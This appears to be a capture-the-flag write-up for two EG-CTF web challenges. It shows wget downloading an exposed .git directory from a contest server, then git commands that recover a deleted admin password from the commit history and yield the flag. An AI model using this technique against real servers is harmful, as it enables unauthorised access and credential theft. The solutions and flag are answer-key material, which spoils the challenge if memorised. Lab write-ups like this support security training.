# EG-CTF
# Write-Up
# 1-Tamp3rat0r
I have check the site and They asked me about username and password and by guess seems like http authentication bypass
and worked. check Tamp3rat0r.py
# 2-Hold Up
i test it with DWP and i found /.git path working and i download the directory <br/>
root@cloudshell: wget --recursive --no-parent http://172.105.76.128/.git/ <br/>
root@cloudshell: ls<br/>
172.105.76.128  <br/>
root@cloudshell: cd 172.105.76.128/<br/>
root@cloudshell:/172.105.76.128 ls -a<br/>
.  ..  .git<br/>
root@cloudshell:/172.105.76.128 cd .git/<br/>
root@cloudshell:/172.105.76.128/.git ls <br/>
branches        config       HEAD   index       index.html?C=D;O=A  index.html?C=M;O=A  index.html?C=N;O=A  index.html?C=S;O=A  info  objects<br/>
COMMIT_EDITMSG  description  hooks  index.html  index.html?C=D;O=D  index.html?C=M;O=D  index.html?C=N;O=D  index.html?C=S;O=D  logs <br/> refs<br/>
// let's check the commits<br/>
root@cloudshell:/172.105.76.128/.git git reflog<br/>
2e3e1a8 HEAD@{0}: commit: Refining<br/>
89329fa HEAD@{1}: commit: NewFeature<br/>
dfecece HEAD@{2}: commit: Addinfo<br/>
b032cf8 HEAD@{3}: commit: Disable<br/>
5b9e491 HEAD@{4}: commit: DelCr<br/>
457168f HEAD@{5}: commit: AddUsetting<br/>
b55d897 HEAD@{6}: commit: editconf<br/>
70ae358 HEAD@{7}: commit (initial): initials<br/>
// i have check this commits one by one and i found <br/>
root@cloudshell:/172.105.76.128/.gitgit show 2e3e1a8<br/>
commit 2e3e1a8c124768ecbb31e92d5c070003924b9254<br/>
Author: Ben ALaa <a.alaa@egcert.eg><br/>
Date:   Thu Nov 14 23:18:26 2019 +0100 <br/>

    Refining 
<br/>
diff --git a/S3cR3tPaTh/config.php b/S3cR3tPaTh/config.php<br/>
index 3d7f801..706d93b 100644<br/>
--- a/S3cR3tPaTh/config.php<br/>
+++ b/S3cR3tPaTh/config.php<br/>
@@ -420,15 +420,6 @@ CONFIG = array(<br/>
 'overwriteprotocol' => '',<br/>
<br/>
 /** <br/>
- * Override webroot<br/>
- * ownCloud attempts to detect the webroot for generating URLs automatically.<br/>
- * For example, if `www.example.com/owncloud` is the URL pointing to the<br/>
- * ownCloud instance, the webroot is `/owncloud`. When proxies are in use, it<br/>
- * may be difficult for ownCloud to detect this parameter, resulting in invalid URLs. <br/>
- <br/>
-'overwritewebroot' => '',<br/>
-<br/>
-/<br/>
   Override condition<br/>
   This option allows you to define a manual override condition as a regular<br/>
   expression for the remote IP address. The keys `overwritewebroot`,<br/>
// this show us the path of admin log in is /S3cR3tPaTh/<br/>
root@cloudshell:/172.105.76.128/.gitgit show 5b9e491<br/>
commit 5b9e491802d53d6af1ef25206ccb0765b64a248b<br/>
Author: Ben ALaa <a.alaa@egcert.eg>
Date:   Thu Nov 14 23:15:11 2019 +0100<br/>
<br/>
    DelCr<br/>
<br/>
diff --git a/S3cR3tPaTh/config.php b/S3cR3tPaTh/config.php<br/>
index 46ed4f3..72e9842 100644<br/>
--- a/S3cR3tPaTh/config.php<br/>
+++ b/S3cR3tPaTh/config.php<br/>
@@ -194,7 +194,7 @@ CONFIG = array(<br/>
 'knowledgebaseenabled' => true,<br/>
<br/>
 /** <br/>
- * Enables or disables avatars or user profile photos<br/>
+ /* Enables or disables avatars or user profile photos<br/>
  * `true` enables avatars, or user profile photos, `false` disables them.<br/>
  * These appear on the User page, on user's Personal pages and are used by some apps<br/>
  * (contacts, mail, etc).<br/>
@@ -469,15 +469,7 @@ CONFIG = array(<br/>
<br/>
<br/>
<br/>
-<br/>
- Admin Credentials<br/>
-<br/>
-'Admin_Login' => 'Administrator' <br/><br/>
-'Admin_Password' => 'FN3ym@bZNaF&'<br/><br/>

///////////////////////////////////////////////////////////////// <br/>
admin = Administrator <br/>
password = FN3ym@bZNaF& <br/>
after i try it #flag : EGCTF{Co0o0o0L_I_g0t_Th3_R3p0} <br/>
sorry if something it's not clear <br/>
////////////////////////////////////////////////////////////////// <br/>
